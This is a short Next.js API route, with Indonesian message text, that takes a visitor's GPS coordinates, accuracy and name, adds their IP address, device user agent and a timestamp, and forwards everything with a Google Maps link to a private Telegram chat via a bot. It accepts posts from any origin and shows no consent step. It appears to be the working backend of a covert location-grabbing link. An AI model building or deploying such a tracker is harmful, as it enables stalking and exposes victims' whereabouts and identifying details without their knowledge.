import type { NextApiRequest, NextApiResponse } from 'next';

export default async function handler(req: NextApiRequest, res: NextApiResponse) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== 'POST') return res.status(405).json({ message: 'Method Not Allowed' });

  const { lat, lon, acc, nama } = req.body;
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  const userAgent = req.headers['user-agent'];
  const timestamp = new Date().toISOString();

  const botToken = process.env.TELEGRAM_BOT_TOKEN!;
  const chatId = process.env.TELEGRAM_CHAT_ID!;
  const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;

  const message = `
📥 *Pelacakan Lokasi Baru*

👤 *Nama:* ${nama}
🖥️ *Perangkat:* ${userAgent}
🌐 *IP Address:* ${ip}
📍 *Lokasi:*
- Latitude: ${lat}
- Longitude: ${lon}
- Akurasi: ${acc} meter
🕒 *Waktu:* ${timestamp}

🔗 [Lihat di Google Maps](${mapUrl})
`;

  await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      chat_id: chatId,
      text: message,
      parse_mode: 'Markdown',
      disable_web_page_preview: true
    })
  });

  res.status(200).json({ message: 'Terkirim ke Telegram' });
}
